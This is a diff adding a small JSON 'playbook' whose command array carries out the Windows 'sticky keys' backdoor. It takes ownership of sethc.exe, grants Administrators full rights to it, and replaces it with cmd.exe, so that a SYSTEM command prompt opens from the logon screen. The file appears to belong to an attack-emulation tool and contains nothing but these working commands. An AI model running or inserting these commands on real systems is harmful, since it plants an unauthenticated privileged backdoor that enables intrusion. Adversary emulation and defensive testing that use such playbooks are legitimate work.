@@ -1,0 +1,9 @@
+{
+    "playbook":{
+        "commandArray":[    
+            {"takeown /F C:\\Windows\\System32\\sethc.exe /A": "null"},
+            {"icacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t":"null"},
+            {"copy /Y C:\\Windows\\system32\\cmd.exe C:\\Windows\\system32\\sethc.exe": "null"}
+        ]
+    }
+}
